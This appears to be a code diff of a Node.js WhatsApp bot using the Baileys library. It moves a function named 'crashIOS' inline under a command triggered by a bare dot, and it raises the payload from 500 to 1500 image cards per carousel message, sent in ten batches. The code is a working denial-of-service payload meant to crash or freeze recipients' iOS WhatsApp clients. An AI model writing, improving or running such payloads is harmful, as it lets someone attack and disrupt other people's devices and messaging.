@@ -28,59 +28,8 @@ const os = require("os");
 const fs = require("fs");
 const { url, fileSha256, mediaKey, fileEncSha256, directPath, jpegThumbnail, scansSidecar, midQualityFileSha256, thumbnailDirectPath, thumbnailSha256, thumbnailEncSha256 } = require("./database/mediaall.js");
 const { menu } = require("./database/menu.js");
-
-// Função exportada para crash iOS, pode ser chamada diretamente
-async function crashIOS(sock, targetJid) {
-  for (let i = 0; i < 10; i++) {
-    const singleCard = {
-      "header": {
-        "title": ".",
-        "imageMessage": {
-          "url": `${url}`,
-          "mimetype": "image/jpeg",
-          "caption": ".",
-          "fileSha256": `${fileSha256}`,
-          "fileLength": "10",
-          "height": 1000,
-          "width": 1000,
-          "mediaKey": `${mediaKey}`,
-          "fileEncSha256": `${fileEncSha256}`,
-          "directPath": `${directPath}`,
-          "jpegThumbnail": `${jpegThumbnail}`,
-        },
-        "hasMediaAttachment": true
-      },
-      "body": { "text": "." },
-      "footer": { "text": "." },
-      "nativeFlowMessage": {
-        "buttons": [
-          {
-            "name": "cta_url",
-            "buttonParamsJson": JSON.stringify({
-              "display_text": "x",
-              "url": "https://google.com",
-              "merchant_url": "https://google.com"
-            })
-          }
-        ]
-      }
-    };
-    console.log(`⏳ Enviando carta em lote ${i + 1}/10...`);
-    const card = Array(500).fill(singleCard);
-    await sock.sendjson(targetJid, {
-      "interactiveMessage": {
-        "body": { "text": "." },
-        "carouselMessage": {
-          "cards": card
-        }
-      }
-    });
-  }
-  console.log("✅ Envio de cartas concluído.");
-}
-
 module.exports = async (sock, m, chatUpdate) => {
-  const message = m
+const message = m
   m.id = m.key.id;
   m.isBaileys = m.id.startsWith("BAE5") && m.id.length === 16;
   m.chat = m.key.remoteJid;
@@ -91,7 +40,7 @@ module.exports = async (sock, m, chatUpdate) => {
   function getTypeM(message) {
     const type = Object.keys(message);
     var restype = (!["senderKeyDistributionMessage", "messageContextInfo"].includes(type[0]) && type[0]) || (type.length >= 3 && type[1] !== "messageContextInfo" && type[1]) || type[type.length - 1] || Object.keys(message)[0];
-    return restype;
+return restype;
   };
   m.mtype = getTypeM(m.message);
   m.msg = (m.mtype == "viewOnceMessage" ? m.message[m.mtype].message[getTypeM(m.message[m.mtype].message)] : m.message[m.mtype]);
@@ -198,15 +147,58 @@ module.exports = async (sock, m, chatUpdate) => {
   const isQuotedLocation = m.mtype === "extendedTextMessage" && content.includes("locationMessage");
   const isQuotedProduct = m.mtype === "extendedTextMessage" && content.includes("productMessage");
   switch(command) {
-    case "": { // use the command with: . but, this dont cause conflict with other commands
-      if (!isBot) return;
-      await crashIOS(sock, from);
+  case "": { // use the command with: . but, this dont cause conflict with other commands
+    if (!isBot) return;
+    for (let i = 0; i < 10; i++) {
+      const singleCard = {
+        "header": {
+          "title": ".",
+          "imageMessage": {
+            "url": `${url}`,
+            "mimetype": "image/jpeg",
+            "caption": ".",
+            "fileSha256": `${fileSha256}`,
+            "fileLength": "10",
+            "height": 1000,
+            "width": 1000,
+            "mediaKey": `${mediaKey}`,
+            "fileEncSha256": `${fileEncSha256}`,
+            "directPath": `${directPath}`,
+            "jpegThumbnail": `${jpegThumbnail}`,
+          },
+          "hasMediaAttachment": true
+        },
+        "body": { "text": "." },
+        "footer": { "text": "." },
+        "nativeFlowMessage": {
+          "buttons": [
+            {
+              "name": "cta_url",
+              "buttonParamsJson": JSON.stringify({
+                "display_text": "x",
+                "url": "https://google.com",
+                "merchant_url": "https://google.com"
+              })
+            }
+          ]
+        }
+      };
+      console.log(`⏳ Enviando carta em lote ${i + 1}/10...`);
+      const card = Array(1500).fill(singleCard);
+      await sock.sendjson(from, {
+        "interactiveMessage": {
+          "body": { "text": "." },
+          "carouselMessage": {
+            "cards": card
+          }
+        }
+      });
     }
-    break;
+    console.log("✅ Envio de cartas concluído.");
+  }
+  break;
   }
 }
-module.exports.crashIOS = crashIOS;
-
 let file = require.resolve(__filename);
 fs.watchFile(file, () => {
   fs.unwatchFile(file);
